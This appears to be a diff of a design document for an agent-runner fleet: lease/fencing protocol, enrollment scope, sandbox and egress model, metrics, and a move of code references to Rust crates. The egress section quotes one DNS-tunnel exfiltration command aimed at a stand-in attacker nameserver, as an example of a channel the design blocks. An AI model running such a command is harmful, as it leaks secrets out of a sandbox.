@@ -15,7 +15,7 @@ Every row is extracted from the sections below; the owner column names the secti
 
 | Invariant | Value | Mechanism | Owner section |
 |---|---|---|---|
-| Lease expiry backstop | `LEASE_TTL_MS` = 30 s (single-sourced in `src/lib/common/constants.zig`) | reclaim sweep re-leases an expired lease with a higher fencing token | §Failure recovery model |
+| Lease expiry backstop | `LEASE_TTL_MS` = 30 s (single-sourced for the control plane in `afd_core`'s timing constants) | reclaim sweep re-leases an expired lease with a higher fencing token | §Failure recovery model |
 | Max run duration | `MAX_RUNTIME_MS` hard cap | `/renew` extends to `min(now+LEASE_TTL_MS, created_at+MAX_RUNTIME_MS)` | §Per-lease renewal |
 | Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the lease | §System guarantees |
 | Sandbox failure fails closed | `UZ-RUN-007` | the child never starts; the lease stays redeliverable | §System guarantees |
@@ -23,12 +23,12 @@ Every row is extracted from the sections below; the owner column names the secti
 | Readiness recovery bound | `min-idle + ceil(active_fleets / 100) × interval` | `SWEEP_BATCH_LIMIT` = 100, keyset cursor on `(updated_at, id)`; ≈6 min at 100 fleets, ≈15 at 1 000, ≈55 at 5 000 | §Failure recovery model |
 | Runner datastore credentials | zero | `build_runner.zig` links no `pg` / `httpz` / `redis`; the only platform surface is `/v1/runners` + `agt_r` | §The split |
 | Control protocol | five verbs | register · heartbeat · lease · report · activity; `me` resolves from the token | §The control protocol |
-| Enrollment gate | `platform_admin` claim | tenant `admin` JWT / `agt_t` key → `403`; `agt_r` revealed once, stored as sha256 | §Registering a runner |
+| Enrollment gate | the `runner:enroll` scope | tenant `admin` JWT / `agt_t` key → `403`; `agt_r` revealed once, stored as sha256 | §Registering a runner |
 | Fresh-mint liveness | `last_seen_at = 0` sentinel | a never-connected runner reads `registered`, not a fake `online` | §Runner state |
 | Runner "status" | three separate categories | `admin_state` enum + derived liveness + append-only `fleet.runner_events` | §Runner state |
 | Memory isolation | one live holder per fleet | `uq_runner_affinity_fleet_id UNIQUE(fleet_id)` + time gate + capture-time fencing | §Memory continuity |
 | Memory hydration | category-pinned byte window | every `core` entry first (newest-first), then the newest non-core entries; deterministic | §Memory continuity |
-| Per-runner metric families | 4, in a fixed 4096-slot table | overflow routes to `runner_id="_other"`; ~0.7 MB constant; zero Postgres on the scrape path | §Observability |
+| Per-runner metric families | 4, in a fixed 4096-series table | overflow routes to `runner_id="_other"`; bounded footprint; zero Postgres on the scrape path | §Observability |
 | Multi-replica gauges | counters exact via `sum by`; `active_leases` approximate | the `+1` grant and `−1` release can land on different replicas | §Multi-replica |
 | Sandbox tiers | 4 (`landlock_full` … `dev_none`) | release builds refuse `dev_none`; tier is orthogonal to egress policy | §Sandbox tiers |
 | Egress policies | 3 (`allow_all` default · `deny_all_egress` · `allow_list_egress`) | host-side default-deny `nftables` on a veth pair; port 53 dropped; IPv4-only at launch | §Egress model |
@@ -45,7 +45,7 @@ Each trap is enforced in its owner section; this list is the index.
 - Sticky routing is a performance hint, never ownership — correctness never blocks on one runner being alive (§Runners are cattle, not pets).
 - Do not conflate runner status into one Kubernetes-style JSONB object; the three categories stay separate (§Runner state).
 - There is no `runner_runtime` Postgres role, and there must never be one (§Datastore role model).
-- `platform_admin` is an auth claim, not a Postgres role — it must not become a database `GRANT` (§Datastore role model).
+- `runner:enroll` is a token scope, not a Postgres role — it must not become a database `GRANT` (§Datastore role model).
 - Quote operators the readiness-recovery formula, not the single-batch case (§Failure recovery model).
 - Sandbox tiers are not egress policy — no tier substitutes for the egress model (§Sandbox tiers).
 - The live tail is never the source of truth; `report` is the durable system of record (§Live activity).
@@ -131,7 +131,7 @@ Recovery latency is **emergent from fleet polling density**, not a hard bound �
 >
 > The same arithmetic is the **cold-start** window. On first deploy the index is empty while streams already hold undelivered entries, so nothing is leasable until a sweep finds it. This is a deliberate, Indy-acked deferral (M141_001 Discovery): a boot-time reconciliation pass and a raised batch bound were both offered and declined, because both are discovery scaffolding the future scheduler replaces. What is *not* deferred is the keyset cursor — without it the fleets past the first batch are never reached at all rather than merely reached late.
 
-> **The renewal gap is closed (§3).** A live child renews its lease through the fenced `/renew` verb before `lease_expires_at`, so execution duration is decoupled from `LEASE_TTL_MS` — which stays short (single-sourced in `src/lib/common/constants.zig`) as the silent-death backstop, *not* as the cap on how long a Fleet may run. Renewal is credit-gated and bounded by a hard `MAX_RUNTIME_MS` cap; a child that stops emitting is not renewed and is reclaimed at its deadline. The runner can now default for fleets that run well past the TTL.
+> **The renewal gap is closed (§3).** A live child renews its lease through the fenced `/renew` verb before `lease_expires_at`, so execution duration is decoupled from `LEASE_TTL_MS` — which stays short (single-sourced for the control plane in `afd_core`'s timing constants) as the silent-death backstop, *not* as the cap on how long a Fleet may run. Renewal is credit-gated and bounded by a hard `MAX_RUNTIME_MS` cap; a child that stops emitting is not renewed and is reclaimed at its deadline. The runner can now default for fleets that run well past the TTL.
 
 ### Per-lease renewal — how a long fleet keeps its lease
 
@@ -167,7 +167,7 @@ Fail-safe by construction: a transient `/renew` failure retries on the next tick
 
 The fleet borrows Kubernetes / Nomad / Temporal **semantics** — leases, fencing, node heartbeats, drain, sticky scheduling, checkpointed workloads — but it is **not** a general orchestrator and must not drift into one. The non-goals are load-bearing; each rejected feature is one we deliberately do not build until a spec changes this direction:
 
-- **Not a general scheduler — beyond label placement.** **Label** placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in **M85_001** (live: `assign.zig` matches `required_tags <@ labels`); capacity / fairness / autoscale stay out of scope. (The earlier "M80_007" reservation for this was a stale ID — M80_007 shipped as the runner-observability spec.)
+- **Not a general scheduler — beyond label placement.** **Label** placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in **M85_001** (live: the lease query in `afd_fleet` matches `required_tags <@ labels`); capacity / fairness / autoscale stay out of scope. (The earlier "M80_007" reservation for this was a stale ID — M80_007 shipped as the runner-observability spec.)
 - **No autoscale.** Runners scale by operators adding hosts, not by the platform reacting to queue depth.
 - **No fairness engine.** No per-tenant weighting, no priority lanes, no preemption.
 - **No arbitrary workload types.** One workload: a NullClaw run from a leased `ExecutionPolicy`.
@@ -196,18 +196,17 @@ The BEFORE/NOW split diagram is front-loaded in §Topology.
 
 ### Where the code lives
 
-The directory layout makes the "runner holds zero datastore credentials" guarantee **structural and grep-visible**, not merely enforced by `build_runner.zig`'s import list. The control plane and the execution plane never share a source tree; the only surface both reach is the frozen wire protocol, consumed as a named Zig module (`@import("contract")`) so neither build graph reaches into the other's source.
+The layout makes the "runner holds zero datastore credentials" guarantee **structural and grep-visible**, not merely enforced by `build_runner.zig`'s import list. The control plane and the execution plane never share a source tree; the only surface both reach is the frozen `/v1/runners` wire protocol, which each plane holds as its own module, so neither build graph reaches into the other's source.
 
 | Layer | Path | Build graph | Links | Role |
 |---|---|---|---|---|
-| `contract` | `src/lib/contract/` | both (named module) | none | frozen `/v1/runners` wire types — `protocol`, `event_envelope`, `execution_policy`, `execution_result`, `activity` |
-| `common` | `src/lib/common/` | both (named module) | none | single-source knobs both planes key off (`LEASE_TTL_MS`, …) |
-| `logging` | `src/lib/logging/` | both (named module) | none | shared logfmt scope helpers |
-| control plane | `src/agentsfleetd/fleet/` | `agentsfleetd` (`build.zig`) | `pg`, `redis` | `assign` / `affinity` / `reclaim` / `service` / `service_report` / `service_activity` — lease / fence / reclaim / assignment |
-| runner daemon | `src/runner/daemon/`, `src/runner/{main,child_supervisor,child_exec,sandbox_args,pipe_proto}.zig` | `agentsfleet-runner` (`build_runner.zig`) | none | runner-side process; imports nothing from `src/agentsfleetd` |
+| wire contract, control plane | `rustd/crates/afd_wire` | `agentsfleetd` | none | frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
+| wire contract, runner | `src/lib/contract/` | `agentsfleet-runner` (named module) | none | the same frozen types on the host side |
+| shared knobs | `rustd/crates/afd_core` · `src/lib/common/` | one per plane | none | the knobs both planes key off (`LEASE_TTL_MS`, …) |
+| runner logging | `src/lib/logging/` | `agentsfleet-runner` (named module) | none | logfmt scope helpers |
+| control plane | `rustd/crates/afd_fleet` · `rustd/crates/afd_runner` · `rustd/crates/afd_api_runner` | `agentsfleetd` (`rustd/crates/agentsfleetd`) | `sqlx`, `redis` | lease / fence / reclaim / assignment, the four background sweeps, and the `/v1/runners` handlers over them |
+| runner daemon | `src/runner/daemon/`, `src/runner/{main,child_supervisor,child_exec,sandbox_args,pipe_proto}.zig` | `agentsfleet-runner` (`build_runner.zig`) | none | runner-side process; imports nothing from the control plane |
 | runner engine | `src/runner/engine/` | `agentsfleet-runner` | none (NullClaw base) | the folded-in NullClaw engine + sandbox glue (`cgroup`, `landlock`, `network`) |
-
-The control-plane handlers under `src/agentsfleetd/fleet/` are faithful mirrors of the deleted worker's `event_loop_writepath` steps — the comments there name their origin so the row-equivalence guarantee (below) is auditable.
 
 ## The control protocol — `/v1/runners`
 
@@ -215,23 +214,23 @@ Five verbs. `agentsfleetd` translates them into the Postgres writes and Redis st
 
 | Verb | Path | Auth | Handler | Purpose |
 |---|---|---|---|---|
-| `register` | `POST /v1/runners` | `Bearer` Clerk JWT carrying `platform_admin` | `runner/register.zig` | platform admin mints a durable `runner_token` (`agt_r`) for a host; record `host_id`, `sandbox_tier`, `labels`. Tenant `admin` JWT / `agt_t` api_key → `403`. Called from the **dashboard "Add runner"** (a session-authed server action) — **not** the runner CLI, and never the host. The operator installs the once-revealed `agt_r` (M84_001) |
-| `heartbeat` | `POST /v1/runners/me/heartbeats` | `Bearer agt_r` | `runner/heartbeat.zig` | liveness; reply carries `status` (`ok` / `drain` / `stop`) and any revoked lease IDs |
-| `lease` | `POST /v1/runners/me/leases` | `Bearer agt_r` | `runner/lease.zig` | long-poll for the next event; reply carries the event, resolved config, secrets, `lease_id`, `fencing_token` — or `null` + `retry_after_ms` |
-| `report` | `POST /v1/runners/me/reports` | `Bearer agt_r` | `runner/report.zig` | terminal result for a lease; `agentsfleetd` persists + `XACK`s after a fencing check |
-| `activity` | `POST /v1/runners/me/leases/{lease_id}/activity` | `Bearer agt_r` | `runner/activity.zig` | write-only progress stream for the live tail; best-effort, no ack |
+| `register` | `POST /v1/runners` | `Bearer` JWT carrying the `runner:enroll` scope | `afd_api_runner`'s enrolment handler | platform admin mints a durable `runner_token` (`agt_r`) for a host; record `host_id`, `sandbox_tier`, `labels`. Tenant `admin` JWT / `agt_t` api_key → `403`. Called from the **dashboard "Add runner"** (a session-authed server action) — **not** the runner CLI, and never the host. The operator installs the once-revealed `agt_r` (M84_001) |
+| `heartbeat` | `POST /v1/runners/me/heartbeats` | `Bearer agt_r` | `afd_api_runner`'s heartbeat handler | liveness; reply carries `status` (`ok` / `drain` / `stop`) and any revoked lease IDs |
+| `lease` | `POST /v1/runners/me/leases` | `Bearer agt_r` | `afd_api_runner`'s lease handler | long-poll for the next event; reply carries the event, resolved config, secrets, `lease_id`, `fencing_token` — or `null` + `retry_after_ms` |
+| `report` | `POST /v1/runners/me/reports` | `Bearer agt_r` | `afd_api_runner`'s report handler | terminal result for a lease; `agentsfleetd` persists + `XACK`s after a fencing check |
+| `activity` | `POST /v1/runners/me/leases/{lease_id}/activity` | `Bearer agt_r` | `afd_api_runner`'s activity handler | write-only progress stream for the live tail; best-effort, no ack |
 
-`me` resolves from the token — no `runner_id` in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human operator* credential; everything else is authed by the machine credential it mints. Identity and auth are covered in [`../AUTH.md`](../AUTH.md) (the runner is the first machine principal). `register` is gated by the `platform_admin` claim — only agentsfleet's platform operator may enroll a host into the shared fleet — so a tenant `admin` JWT or a `agt_t` api_key is rejected `403`.
+`me` resolves from the token — no `runner_id` in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human operator* credential; everything else is authed by the machine credential it mints. Identity and auth are covered in [`../AUTH.md`](../AUTH.md) (the runner is the first machine principal). `register` is gated by the `runner:enroll` scope — grantable on its own, because enrolling a host into the shared fleet is the one capability that exposes every tenant's secrets to it — so a token without that scope is rejected `403`, tenant `admin` JWT and `agt_t` api_key alike.
 
 ## Registering a runner
 
-A runner needs a `agt_r` token before it can pull work. The **platform admin pre-mints it from the dashboard** and installs it on the host — the host never self-registers (Option B, the GitLab-16 "create runner → authentication token" model). The admin opens **dashboard → Admin → Runners → "Add runner"**; a session-authed server action calls `POST /v1/runners`; `agentsfleetd` mints the `agt_r` and reveals it **once** (copy-to-clipboard, then dropped from the browser), and the admin drops it into the host's vault / `AGENTSFLEET_RUNNER_TOKEN` env var. No identity credential ever touches a shell (M84_001 retired the `register --token` CLI). On boot the daemon validates the `agt_r` prefix (fail-loud, not a silent 401 loop) and goes straight to the heartbeat/lease loop — no register call, so no host ever holds an enrollment-grade credential. There is no enrollment token; the minter must hold `platform_admin`. The open-fleet, self-enrolling case is mode C, later.
+A runner needs a `agt_r` token before it can pull work. The **platform admin pre-mints it from the dashboard** and installs it on the host — the host never self-registers (Option B, the GitLab-16 "create runner → authentication token" model). The admin opens **dashboard → Admin → Runners → "Add runner"**; a session-authed server action calls `POST /v1/runners`; `agentsfleetd` mints the `agt_r` and reveals it **once** (copy-to-clipboard, then dropped from the browser), and the admin drops it into the host's vault / `AGENTSFLEET_RUNNER_TOKEN` env var. No identity credential ever touches a shell (M84_001 retired the `register --token` CLI). On boot the daemon validates the `agt_r` prefix (fail-loud, not a silent 401 loop) and goes straight to the heartbeat/lease loop — no register call, so no host ever holds an enrollment-grade credential. There is no enrollment token; the minter must hold `runner:enroll`. The open-fleet, self-enrolling case is mode C, later.
 
 ```
  platform admin                                          agentsfleetd
- (dashboard session; metadata.platform_admin=true)
+ (dashboard session carrying runner:enroll)      
    │ "Add runner" server action → POST /v1/runners   🔒 GATE 1 — who may enroll:
-   │   Authorization: Bearer <session-JWT>           platform_admin claim required
+   │   Authorization: Bearer <session-JWT>           runner:enroll scope required 
    │   { host_id, assigned_policy{sandbox_tier,     (tenant admin / agt_t → 403)
    │     network_policy, registry_allowlist[],
    │     worker_count}, labels[] }
@@ -261,7 +260,7 @@ Before capability can be reported it has to be established: systemd's `Delegate=
 
 Capability flows **up**. At startup and on every heartbeat tick, the daemon probes what the kernel can actually enforce: Landlock ABI, seccomp installability, delegated cgroup `subtree_control` controllers, bubblewrap presence, and `egress_enforcement` (pinned false until the `EgressScope` wiring ships). It sends the report on the first beat and again whenever the answer changes (`capability_probe.zig`).
 
-The heartbeat handler reconciles assigned against achievable through a pure verdict function (`heartbeat_reconcile.zig`), writing the row's `degraded` flag and `degraded_reason`. The reason names the one missing mechanism in operator vocabulary — "cgroup controllers not delegated" maps to a bootstrap playbook step.
+The heartbeat handler reconciles assigned against achievable through a pure verdict function (`afd_runner`'s reconcile module), writing the row's `degraded` flag and `degraded_reason`. The reason names the one missing mechanism in operator vocabulary — "cgroup controllers not delegated" maps to a bootstrap playbook step.
 
 The verdict gates work on **both sides, and fails closed**. The control plane's lease handler issues nothing to a degraded row, and an unreadable verdict also issues nothing. The runner's workers refuse to lease while the reply says degraded, or while no decodable assignment is held — `AppliedPolicy` holds nothing on a malformed policy, never the previous value and never a permissive default.
 
@@ -307,9 +306,9 @@ Both routes require `runner:read`. Neither item struct carries `token_hash` or `
 
 **The lease read's index support is load-bearing, not incidental.** `fleet.runner_leases` gains a row per claim and another per reclaim. One worker turning a short event every `LEASE_TTL_MS` accrues roughly 2.9k rows a day, and `MAX_WORKER_COUNT` workers make that about 184k.
 
-Two indexes serve the read. `idx_runner_leases_runner_id_created_at_id` answers the page, and `idx_runner_leases_fleet_id_event_id_fencing_token` answers the per-row reclaim derivation. On `fleet.runner_events`, `idx_runner_events_runner_id_type_created_at_id` serves the Activity page's rare-lifecycle-tag filter and its count, so that read stops walking the per-lease bulk. A partial index was rejected there: the tag list binds as a parameter array, and a partial-index predicate cannot be proven against one. Read cost stays flat as history grows, and `db/index_usage_integration_test.zig` pins both the shapes and the plans.
+Two indexes serve the read. `idx_runner_leases_runner_id_created_at_id` answers the page, and `idx_runner_leases_fleet_id_event_id_fencing_token` answers the per-row reclaim derivation. On `fleet.runner_events`, `idx_runner_events_runner_id_type_created_at_id` serves the Activity page's rare-lifecycle-tag filter and its count, so that read stops walking the per-lease bulk. A partial index was rejected there: the tag list binds as a parameter array, and a partial-index predicate cannot be proven against one. Read cost stays flat as history grows, and the index-usage integration lane pins both the shapes and the plans.
 
-**History is bounded, not integral.** The retention sweeper (`fleet/retention_sweeper.zig`, registered beside the liveness and reclaim sweepers) deletes terminal-status leases in bounded batches once 30 days pass from settlement. The clock is `updated_at`, which settle and reclaim both stamp, so a lease acquired long ago and settled yesterday keeps its full window.
+**History is bounded, not integral.** The retention sweeper (`afd_runner`'s retention sweep, supervised beside the liveness, reclaim and repair sweepers) deletes terminal-status leases in bounded batches once 30 days pass from settlement. The clock is `updated_at`, which settle and reclaim both stamp, so a lease acquired long ago and settled yesterday keeps its full window.
 
 Only the per-lease event tags are eligible — `PER_LEASE_EVENT_TYPES`, meaning `lease_acquired` and `lease_released`. The lifecycle tags are the Activity feed's entire content and are kept at any age.
 
@@ -329,7 +328,7 @@ Teardown unregisters the tenant's upstream schedule timers *before* the row purg
 
 The purge answers by identity, not by cardinality. It counts the fleets it erased that the caller never enumerated, so a fleet created mid-teardown cannot hide inside an unchanged count by being offset against one deleted concurrently. Where a whole tenant's schedules leak at once — absent provider credentials — every schedule identifier is written to the log before the purge erases the rows that name them, because after that nothing else can.
 
-**Every list pages by cursor, or does not page at all.** `parsePageParams` and the `page`/`page_size` shape are gone from the daemon. The three former page-number reads — `/v1/fleets/runners`, `…/runners/{id}/events`, `/v1/api-keys` — answer `{items, total, next_cursor}` behind `starting_after`/`limit`; `fleet_runtime/keyset_cursor.zig` widened once to carry either an integer or a text sort value beside the row id, which is what lets the API-keys `key_name` sort page without loss. Fleets renamed its request parameter and response field to the guideline spelling, and memory gained keyset paging over `(created_at, key)` with its own supporting index (`idx_memory_entries_fleet_id_created_at_key`). A retired parameter answers 400 rather than being silently ignored, and a cursor whose id half is not a UUID is refused at parse rather than reaching a `::uuid` bind. The already-keyset families that still spell the request parameter `cursor` — fleet events, workspace events, billing, approvals — are a named follow-up, not an oversight.
+**Every list pages by cursor, or does not page at all.** `parsePageParams` and the `page`/`page_size` shape are gone from the daemon. The three former page-number reads — `/v1/fleets/runners`, `…/runners/{id}/events`, `/v1/api-keys` — answer `{items, total, next_cursor}` behind `starting_after`/`limit`; `afd_core`'s paging cursor carries either an integer or a text sort value beside the row id, which is what lets the API-keys `key_name` sort page without loss. Fleets renamed its request parameter and response field to the guideline spelling, and memory gained keyset paging over `(created_at, key)` with its own supporting index (`idx_memory_entries_fleet_id_created_at_key`). A retired parameter answers 400 rather than being silently ignored, and a cursor whose id half is not a UUID is refused at parse rather than reaching a `::uuid` bind. The already-keyset families that still spell the request parameter `cursor` — fleet events, workspace events, billing, approvals — are a named follow-up, not an oversight.
 
 ## Datastore role model — why there is no `runner_runtime`
 
@@ -337,16 +336,16 @@ Access to the runner-domain tables (`fleet.runners`, `fleet.runner_leases`, `fle
 
 | Layer | Mechanism | Answers | Enforced where |
 |-------|-----------|---------|----------------|
-| **App authorization** | `platform_admin` JSON Web Token (JWT) claim | *Which API caller* may enroll / list / manage runners | request handlers (`src/agentsfleetd/auth/claims.zig`) |
+| **App authorization** | the `runner:enroll` scope on the verified token | *Which API caller* may enroll / list / manage runners | the request handlers' authorization layer |
 | **Datastore identity** | `api_runtime` Postgres role | *Which process identity* writes the rows | Postgres `GRANT` |
 
 ```
-   caller (Clerk JWT, platform_admin=true)            runner (agt_r token, NO db creds)
+   caller (Clerk JWT, runner:enroll)                  runner (agt_r token, NO db creds)
         │  GET/POST /v1/fleet, /v1/runners                  │  POST /v1/runners/me/leases
         ▼                                                   ▼
    ┌─────────────────────────────────────────────────────────────────────────┐
    │ agentsfleetd                                                            │
-   │   Layer 1 — claim check: is caller platform_admin?  (admin routes)      │
+   │   Layer 1 — scope check: does caller hold runner:enroll? (admin routes) │
    │   Layer 2 — writes fleet.* connecting to PG as api_runtime              │
    └─────────────────────────────────────────────────────────────────────────┘
                                         ▼
@@ -358,7 +357,7 @@ Access to the runner-domain tables (`fleet.runners`, `fleet.runner_leases`, `fle
 Three load-bearing facts:
 
 1. **The runner never authenticates to Postgres.** It holds zero datastore credentials and reaches the platform only over `/v1/runners`. `agentsfleetd` writes every `fleet.*` row *on the runner's behalf*, connecting as `api_runtime`. Schema files `021`/`022`/`023` grant the fleet tables to `api_runtime` only — the newest tables in the system never even mention `worker_runtime`, which is dead substrate removed wholesale in the worker-substrate retirement workstream.
-2. **`platform_admin` is not a Postgres role — it is an auth claim.** "platform_admin has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1 (it gates `register` and the fleet-management routes). It is not, and must not become, a database `GRANT`.
+2. **`runner:enroll` is not a Postgres role — it is a token scope.** "whoever may enroll has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1 (it gates `register` and the fleet-management routes). It is not, and must not become, a database `GRANT`.
 3. **Therefore there is no `runner_runtime` role, and there must never be one.** A `runner_*`-named datastore role would assert that the runner connects to the datastore — exactly the guarantee this fleet is built to deny. (An in-PR `worker_runtime`→`runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.)
 
 If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role — name it `fleet_runtime`, back it with its own pool, and justify it with a real threat model that treats the fleet writes as a distinct compromise surface. It is never a runner-named role, and it stays out of scope while `agentsfleetd` runs a single write pool: a second role with no second pool or code path is the dead-role anti-pattern the role-consolidation work exists to eliminate.
@@ -488,7 +487,7 @@ RUN 2  (next run, same fleet A)                          ◄── THE CARRY-OVE
 
 ## Live activity (the SSE tail)
 
-NullClaw emits progress frames mid-run (tool started, response chunk, tool completed). The runner holds no Redis, so the child emits frames over its stdout pipe (`src/runner/pipe_proto.zig`, length-prefixed typed frames, `A` = activity, `R` = result, multiplexed because stdout crosses bwrap cleanly). The parent forwards each `A` frame to `agentsfleetd` over the `activity` verb. `fleet/service_activity.zig` translates it to the `PUBLISH` on `fleet:{id}:activity`. Downstream Server-Sent Events (SSE) is unchanged.
+NullClaw emits progress frames mid-run (tool started, response chunk, tool completed). The runner holds no Redis, so the child emits frames over its stdout pipe (`src/runner/pipe_proto.zig`, length-prefixed typed frames, `A` = activity, `R` = result, multiplexed because stdout crosses bwrap cleanly). The parent forwards each `A` frame to `agentsfleetd` over the `activity` verb. `afd_fleet`'s activity path translates it to the `PUBLISH` on the `fleet:{id}:activity` channel `afd_sse` names. Downstream Server-Sent Events (SSE) is unchanged.
 
 ```
 NullClaw child ─pipe(A frames)─► runner parent ─POST .../activity (no ack)─► agentsfleetd ─PUBLISH─► SSE
@@ -526,7 +525,7 @@ The credit-pool billing model debits twice per event, and both debits live on `a
 - At **report**: reconcile the run's telemetry row to the actual token counts. The charged amount stays at the pre-execution estimate — report updates telemetry, it does not re-charge.
 - At **renewal** (M80_006 `/renew`): the same balance gate re-runs as a **coverage check only** — no debit, no telemetry row. A live child's renewal is refused with `UZ-RUN-012` when the tenant can no longer cover the run; the child is killed and the lease ends at its current deadline, never extended. In M80_006 a renewed lease is **not** re-billed — the run charge at lease issue covers the whole run however many renewals extend it (M80_010 later moves the run debit onto these ticks as a per-slice Δ-debit). The gate's exhaustion policy is resolved **once at startup** and carried on the request `Context` (`ctx.balance_policy`), shared by the lease and renewal paths — not re-read from the environment per request.
 
-Receive credits are not refunded if the run later exhausts. This mirrors the deleted `metering.zig` exactly; only the caller moved from the worker to `agentsfleetd`'s lease/report path. **Metering never stops, and the gate bites whenever a wallet is empty** — `UZ-RUN-012` is reachable for any exhausted tenant. Free usage is a balance rather than a window; that is canonical in [`billing_and_provider_keys.md` §2.3](./billing_and_provider_keys.md#23-free-usage-is-a-balance-never-a-window).
+Receive credits are not refunded if the run later exhausts. Both debits sit on `agentsfleetd`'s lease/report path, and nowhere else. **Metering never stops, and the gate bites whenever a wallet is empty** — `UZ-RUN-012` is reachable for any exhausted tenant. Free usage is a balance rather than a window; that is canonical in [`billing_and_provider_keys.md` §2.3](./billing_and_provider_keys.md#23-free-usage-is-a-balance-never-a-window).
 
 ## Redis topology — what changed
 
@@ -612,7 +611,7 @@ Three network policies:
 
 **The merged allowlist (one source for Layer 4 (L4) + Layer 7 (L7)).** `network/AllowList.build` merges, deduped first-seen: the lease's inference endpoint host ∪ the package-registry baseline from runner config (falling back to `AllowList.DEFAULT_REGISTRY`'s 8 package registries) ∪ the per-fleet `network.allow`. The **same** `AllowList` feeds both the kernel `nftables` set (L4) and the `http_request`/`web_fetch` tool checks (L7), so the two can never disagree.
 
-**The inference host is control-plane-authored — no parent-side drift.** The allowlist must permit exactly the host the fleet's LLM call dials. The provider→URL map lives in NullClaw's `providers/factory.zig` (`compatibleProviderUrl`); `agentsfleetd` reads **that** table (not a copy) in `fleet/service.resolveExecutionPolicy`, extracts the host (`execution_policy.hostFromUrl`), and carries it on the lease as `ExecutionPolicy.inference_host`. The runner allowlists exactly what the engine reaches.
+**The inference host is control-plane-authored — no parent-side drift.** The allowlist must permit exactly the host the fleet's LLM call dials. The provider→URL map lives in NullClaw's `providers/factory.zig` (`compatibleProviderUrl`); `agentsfleetd` reads **that** table (not a copy) when it resolves the execution policy in `afd_credential`, extracts the host, and carries it on the lease as `ExecutionPolicy.inference_host`. The runner allowlists exactly what the engine reaches.
 
 **Name resolution is parent-provided; there is no reachable resolver.** The parent renders a static `/etc/hosts` (each allowlist name → its lease-setup-resolved IP) and a resolver-less `/etc/resolv.conf`, ro-bound into the sandbox. `nftables` drops **all** child egress to port 53, so no forwarding resolver is reachable — closing the DNS-tunnel exfil channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution** (no 30-second hang), and that name rides the tool error into the fleet's turn.
 
@@ -686,7 +685,7 @@ They carry no fleet, workspace, tenant, event, lease, or runner label — they d
 
 `fleet_ready_depth` is **sampled**, not counted. The index is one hash shared by every replica, so a process-local mark/clear counter could not describe it. One replica marks while another clears. A restart zeroes the local delta. A repeat mark for an already-present fleet changes no field count. The reclaim sweeper reads the real field count once per pass and the scrape renders that, which costs one sweep interval of staleness and keeps the render path datastore-free. Every replica samples the same hash, so the fleet-wide value is any single instance's series — a dashboard must not sum it.
 
-The four per-runner families live in a process-global, allocator-free, fixed-capacity (4096-slot) hash table keyed on `runner_id` (`src/agentsfleetd/observability/metrics_runner.zig`, mirroring `metrics_counters.zig`). The render path reads only that in-memory snapshot — **zero Postgres on the scrape path**, so `/metrics` stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore constant (~0.7 MB) regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).
+The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `afd_observability`: a lookup takes a read lock and the counters underneath it are atomics, so recording never blocks another recorder. The render path reads only that in-memory snapshot — **zero Postgres on the scrape path**, so `/metrics` stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).
 
 ### Multi-replica (`agentsfleetd` N>1) — correctness is an *aggregation* property
 
